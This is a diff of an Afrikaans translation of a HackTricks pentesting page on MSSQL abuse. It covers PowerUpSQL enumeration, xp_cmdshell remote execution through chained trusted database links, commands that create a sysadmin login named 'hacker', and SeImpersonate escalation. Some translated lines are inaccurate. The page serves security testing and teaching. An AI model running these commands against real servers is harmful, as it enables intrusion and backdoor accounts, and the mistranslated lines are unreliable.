@@ -4,26 +4,26 @@
 
 <summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).
+* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 
-## **MSSQL Opname / Ontdekking**
+## **MSSQL Opsoek / Ontdekking**
 
 Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Enumereer van die netwerk sonder 'n domein-sessie
+### Enumereer van die netwerk sonder domeinsessie
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -85,7 +85,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL Vertroue Skakels
 
-As 'n MSSQL-instantie vertrou word (databasis skakel) deur 'n ander MSSQL-instantie. As die gebruiker voorregte het oor die vertroue databasis, sal hy in staat wees om **die vertrouensverhouding te gebruik om ook navrae in die ander instantie uit te voer**. Hierdie vertrouens kan geketting word en op 'n stadium mag die gebruiker 'n sleg gekonfigureerde databasis vind waar hy bevele kan uitvoer.
+As 'n MSSQL-instantie vertrou word (databasiskakel) deur 'n ander MSSQL-instantie. As die gebruiker voorregte het oor die vertroue databasis, sal hy in staat wees om **die vertrouensverhouding te gebruik om ook navrae in die ander instantie uit te voer**. Hierdie vertrouens kan geketting word en op 'n stadium mag die gebruiker 'n sleg gekonfigureerde databasis vind waar hy bevele kan uitvoer.
 
 **Die skakels tussen databasisse werk selfs oor bosvertrouens.**
 
@@ -133,15 +133,15 @@ Merk op dat metasploit sal probeer om slegs die `openquery()`-funksie in MSSQL t
 
 ### Handmatig - Openquery()
 
-Vanaf **Linux** kan jy 'n MSSQL-konsole-skul met **sqsh** en **mssqlclient.py** verkry.
+Vanaf **Linux** kan jy 'n MSSQL-konsoleskild verkry met **sqsh** en **mssqlclient.py.**
 
 Vanaf **Windows** kan jy ook die skakels vind en bevele handmatig uitvoer met 'n **MSSQL-klient soos** [**HeidiSQL**](https://www.heidisql.com)
 
 _Aanmelding met Windows-outentifisering:_
 
-![](<../../.gitbook/assets/image (805).png>) 
+![](<../../.gitbook/assets/image (805).png>)
 
-#### Betroubare Skakels
+#### Betroubare Skakels vind
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -155,12 +155,12 @@ Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuut toegan
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Kontroleer waar dubbelpunt en enkelkwotasies gebruik word, dit is belangrik om hulle op daardie manier te gebruik.
+Kontroleer waar dubbelpunt en enkel aanhalingstekens gebruik word, dit is belangrik om hulle op daardie manier te gebruik.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (640).png>)
 
-Jy kan hierdie vertroude skakelketting vir ewig handmatig voortgesit.
+Jy kan hierdie vertroude skakelketting vir ewig voortsit op 'n outomatiese manier.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -168,31 +168,34 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-### Handleiding - UITVOER
+Indien jy nie kan optree soos `exec xp_cmdshell` vanaf `openquery()` nie, probeer met die `EXECUTE` metode.
 
-Jy kan ook vertroue skakels misbruik deur `UITVOER` te gebruik:
+### Handleiding - EXECUTE
+
+Jy kan ook vertroue skakels misbruik deur `EXECUTE` te gebruik:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Plaaslike Bevoorregte-escalasie
+## Plaaslike Voorregverhoging
 
-Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe bevoorregting genaamd **`SeImpersonatePrivilege`**. Dit laat die rekening toe om "‘n kliënt na outentifikasie te impersoneer".
+Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit gee die rekening die vermoë om "op te tree as 'n kliënt na verifikasie".
 
-'n Strategie wat baie outeurs bedink het, is om 'n SISTEEM-diens te dwing om aan 'n bedrieglike of man-in-die-middel-diens te outentifiseer wat die aanvaller skep. Hierdie bedrieglike diens kan dan die SISTEEM-diens impersoneer terwyl dit probeer outentifiseer.
+'n Strategie wat baie outeurs bedink het, is om 'n SISTEEM-diens te dwing om te verifieer na 'n bedrieglike of man-in-die-middel-diens wat die aanvaller skep. Hierdie bedrieglike diens kan dan die SISTEEM-diens naboots terwyl dit probeer verifieer.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n verskeidenheid van hierdie tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` bevel.
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 <details>
 
-<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
